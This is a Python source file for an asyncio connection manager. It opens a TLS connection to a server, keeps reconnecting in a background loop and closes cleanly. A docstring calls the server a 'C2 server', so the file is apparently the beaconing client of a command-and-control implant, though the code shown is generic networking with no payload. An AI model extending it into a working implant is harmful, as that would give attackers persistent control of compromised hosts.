import os
import logging
import asyncio

from models.tls_helper import TLSSessionHelper

logger = logging.getLogger(__name__)


class ConnectionManager:
    def __init__(self, server_host: str, server_port: int, client_id: str):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = client_id
        self.reader = None
        self.writer = None
        self._connected_event = asyncio.Event()
        self._reconnection_task = None
        self._should_stop = False
    
    @property
    def is_connected(self):
        return self.reader is not None and self.writer is not None
    
    async def wait_connected(self):
        """Wait until connection is established"""
        await self._connected_event.wait()
        
    async def _open_connection(self) -> bool:
        """
        Connect to C2 server and register
        """
        try:
            ssl_ctx = TLSSessionHelper().create_context(
                is_server=False,
            )
            self.reader, self.writer = await asyncio.open_connection(
                self.server_host,
                self.server_port,
                ssl=ssl_ctx,
            )
            self._connected_event.set()
            logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
            return True
        except ConnectionRefusedError:
            logger.error("Connection refused, server possibly down")
            return False
        except asyncio.CancelledError:
            logger.info("Connection attempt cancelled")
            return False
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False
    
    async def _clear_connection(self):
        self._connected_event.clear()
        try:
            if self.writer and not self.writer.is_closing():
                self.writer.close()
                await self.writer.wait_closed()
                logger.info("Connection cleared")
        except Exception as e:
            logger.error(f"Error closing writer: {e}")
        finally:
            self.reader = None
            self.writer = None

    async def _reconnection_loop(self):
        """
        Background reconnection loop - runs continuously
        """
        try:
            reconnect_delay = 1
            
            while not self._should_stop:
                if not self.is_connected:
                    logger.info("Connection lost, attempting to reconnect...")
                    await self._clear_connection()
                    
                    if await self._open_connection():
                        logger.info("Reconnection successful")
                    else:
                        await asyncio.sleep(reconnect_delay)
                else:
                    await asyncio.sleep(1)  # Check connection status periodically
                    
        except asyncio.CancelledError:
            logger.info("Reconnection loop cancelled")
            raise
        except Exception as e:
            logger.error(f"Reconnection loop error: {e}")
            raise
        finally:
            await self._clear_connection()

    async def start(self):
        """Start connection manager with background reconnection"""
        if self._reconnection_task:
            logger.warning("Connection manager already started")
            return
        
        self._reconnection_task = asyncio.create_task(self._reconnection_loop(), name='reconnection')
        await self.wait_connected()  # Wait for initial connection

    async def close(self):
        self._should_stop = True
        if self._reconnection_task:
            self._reconnection_task.cancel()
            try:
                await self._reconnection_task
            except asyncio.CancelledError:
                pass
        await self._clear_connection()

    @property
    def is_connected(self):
        return self.reader is not None and self.writer is not None